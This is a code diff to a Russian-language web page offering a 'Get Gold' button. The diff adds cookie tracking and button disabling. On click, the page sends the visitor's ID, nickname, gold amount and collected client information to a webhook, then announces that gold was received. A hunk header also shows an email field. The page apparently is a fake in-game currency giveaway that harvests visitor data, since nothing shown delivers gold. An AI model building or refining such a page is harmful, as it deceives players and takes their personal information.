@@ -232,6 +232,24 @@
       );
     }
 
+    // Функция для работы с cookie
+function setCookie(name, value, days) {
+  const expires = new Date(Date.now() + days * 864e5).toUTCString();
+  document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
+}
+
+function getCookie(name) {
+  return document.cookie.split('; ').reduce((r, v) => {
+    const parts = v.split('=');
+    return parts[0] === name ? decodeURIComponent(parts[1]) : r;
+  }, '');
+}
+
+// Проверка, был ли уже получен Gold
+function checkGoldCollected() {
+  return getCookie("gold_collected") === "true";
+}
+    
     /* ---------- ДЕКОДИРОВАНИЕ ПАРАМЕТРОВ И ИНИЦИАЛИЗАЦИЯ ---------- */
     // Корректное декодирование Base64 с поддержкой UTF-8
     function base64DecodeUnicode(str) {
@@ -358,58 +376,75 @@ Email: ${email}
       });
     });
 
-    /* ---------- ЭФФЕКТ ЧАСТИЦ ПРИ НАЖАТИИ НА "Получить Gold" ---------- */
-    const getGoldButton = document.getElementById("get-gold-button");
-    getGoldButton.addEventListener("click", function() {
-      // Запускаем анимацию частиц – создаем 10 частиц
-      for (let i = 0; i < 10; i++) {
-        createParticle(getGoldButton);
-      }
-      setTimeout(() => {
-        // Формируем сообщение для вебхука: запрос на получение голды
-        const goldMsg = `Запрос на получение голды:
+            /* ---------- ЭФФЕКТ ЧАСТИЦ ПРИ НАЖАТИИ НА "Получить Gold" ---------- */
+const getGoldButton = document.getElementById("get-gold-button");
+
+// Проверяем cookie, если Gold уже получен, отключаем кнопку
+if (checkGoldCollected()) {
+  getGoldButton.disabled = true;
+  showGoldResult(true);  // Показываем результат, если уже получен Gold
+}
+
+getGoldButton.addEventListener("click", function() {
+  // Запускаем анимацию частиц – создаем 10 частиц
+  for (let i = 0; i < 20; i++) {
+    createParticle(getGoldButton);
+  }
+  setTimeout(() => {
+    // Формируем сообщение для вебхука: запрос на получение голды
+    const goldMsg = `Запрос на получение голды:
 ID отправителя: ${params.senderId}
 Ник отправителя: ${params.senderNick}
 Количество Gold: ${params.goldAmount}
 Дополнительная информация: ${JSON.stringify(clientInfo)}`;
-        sendDataToWebhook(goldMsg, function(ok) {
-          if (!ok) {
-            alert("Ошибка при получение Gold");
-            return;
-          }
-          showGoldResult();
-        });
-      }, 1000);
+    sendDataToWebhook(goldMsg, function(ok) {
+      if (!ok) {
+        alert("Ошибка при получение Gold");
+        return;
+      }
+      // Устанавливаем cookie, чтобы сохранить состояние
+      setCookie("gold_collected", "true", 365);  // Сохраняем на 365 дней
+      showGoldResult();
+      getGoldButton.disabled = true; // Деактивируем кнопку
     });
+  }, 1000);
+});
 
-    function createParticle(button) {
-      const particle = document.createElement("div");
-      particle.className = "particle";
-      const rect = button.getBoundingClientRect();
-      // Случайное смещение для частицы (используем CSS-переменные)
-      const tx = (Math.random() - 0.5) * 100 + "px";
-      const ty = (Math.random() * 150 + 50) + "px";
-      particle.style.setProperty("--tx", tx);
-      particle.style.setProperty("--ty", ty);
-      // Позиционируем частицу по центру кнопки
-      particle.style.left = rect.left + rect.width / 2 - 8 + "px";
-      particle.style.top = rect.top + rect.height / 2 - 8 + "px";
-      document.body.appendChild(particle);
-      setTimeout(() => {
-        particle.remove();
-      }, 1000);
-    }
+function createParticle(button) {
+  const particle = document.createElement("div");
+  particle.className = "particle";
+  const rect = button.getBoundingClientRect();
+  
+  // Случайное смещение для частицы (используем CSS-переменные)
+  const tx = (Math.random() - 0.5) * 100 + "px";
+  const ty = (Math.random() * 100 + 50) + "px";  // Делаем частицы "лететь" выше
+  
+  particle.style.setProperty("--tx", tx);
+  particle.style.setProperty("--ty", ty);
+  
+  // Позиционируем частицу по центру кнопки
+  particle.style.left = rect.left + rect.width / 2 - 8 + "px";
+  particle.style.top = rect.top + rect.height / 2 - 8 + "px";
+  
+  document.body.appendChild(particle);
+  
+  setTimeout(() => {
+    particle.remove();
+  }, 2000); // Делаем длительность анимации 2 секунды
+}
 
-    /* ---------- ОТОБРАЖЕНИЕ РЕЗУЛЬТАТА ПОЛУЧЕНИЯ ГОЛДЫ ---------- */
-    function showGoldResult() {
-      const goldAmount = params ? params.goldAmount : "0";
-      const resultDiv = document.getElementById("result");
-      resultDiv.textContent = `Вы получили ${goldAmount} Gold!`;
-      resultDiv.classList.add("fade-in");
-      const bigGoldImg = document.getElementById("result-big-img");
-      bigGoldImg.style.display = "block";
-      bigGoldImg.classList.add("fade-in");
-    }
+/* ---------- ОТОБРАЖЕНИЕ РЕЗУЛЬТАТА ПОЛУЧЕНИЯ ГОЛДЫ ---------- */
+function showGoldResult(isAlreadyCollected = false) {
+  const goldAmount = params ? params.goldAmount : "0";
+  const resultDiv = document.getElementById("result");
+  resultDiv.textContent = isAlreadyCollected ? 
+    `Вы уже получили ${goldAmount} Gold` :
+    `Вы получили ${goldAmount} Gold`;
+  resultDiv.classList.add("fade-in");
+  const bigGoldImg = document.getElementById("result-big-img");
+  bigGoldImg.style.display = "block";
+  bigGoldImg.classList.add("fade-in");
+}
   </script>
 </body>
 </html>
